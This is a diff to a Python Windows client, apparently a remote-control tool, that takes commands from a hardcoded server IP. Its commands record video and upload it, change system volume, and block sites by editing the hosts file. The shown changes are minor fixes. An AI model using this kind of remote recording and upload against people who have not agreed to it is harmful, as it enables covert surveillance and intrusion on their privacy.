@@ -28,6 +28,7 @@ from ctypes import POINTER, cast
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import pyperclip
 from pynput import mouse
+import pythoncom
 
 SERVER_URL = "http://193.124.121.76:4443"
 
@@ -237,6 +238,7 @@ class PCClient:
                 for i in range(count):
                     res, fdata, ftype = self.record_video(10)
                     if fdata and ftype == 'video':
+                        print(f"Отправка видеофрагмента {i+1}/{count}")
                         self.send_command_result(command['id'], f"Видео {i+1}/{count}", fdata, ftype)
                         video_files.append(fdata)
                 result = f"Записано {len(video_files)} видео. Сервер склеит их."
@@ -284,6 +286,7 @@ class PCClient:
                     gpu = 'Не удалось получить'
                 result = f"CPU: {cpu}%\nRAM: {ram.percent}% ({ram.used//(1024**2)}МБ/{ram.total//(1024**2)}МБ)\nДиски:\n" + '\n'.join(disk_info) + f"\nGPU: {gpu}"
             elif cmd == 'volume_up_10':
+                pythoncom.CoInitialize()
                 devices = AudioUtilities.GetSpeakers()
                 interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                 volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -291,6 +294,7 @@ class PCClient:
                 volume.SetMasterVolumeLevelScalar(min(current + 0.1, 1.0), None)
                 result = "Громкость увеличена на 10%"
             elif cmd == 'volume_down_10':
+                pythoncom.CoInitialize()
                 devices = AudioUtilities.GetSpeakers()
                 interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                 volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -298,6 +302,7 @@ class PCClient:
                 volume.SetMasterVolumeLevelScalar(max(current - 0.1, 0.0), None)
                 result = "Громкость уменьшена на 10%"
             elif cmd == 'volume_mute':
+                pythoncom.CoInitialize()
                 devices = AudioUtilities.GetSpeakers()
                 interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                 volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -383,7 +388,7 @@ class PCClient:
                         f.write(f"\n127.0.0.1 {url}\n")
                     result = f"Сайт {url} заблокирован"
                 except Exception as e:
-                    result = f"Ошибка: {e}"
+                    result = f"Ошибка: {e}\nЗапустите клиента от имени администратора для блокировки сайтов!"
             elif cmd.startswith('unblock_site:'):
                 url = cmd[len('unblock_site:'):].strip()
                 hosts = r"C:\Windows\System32\drivers\etc\hosts"
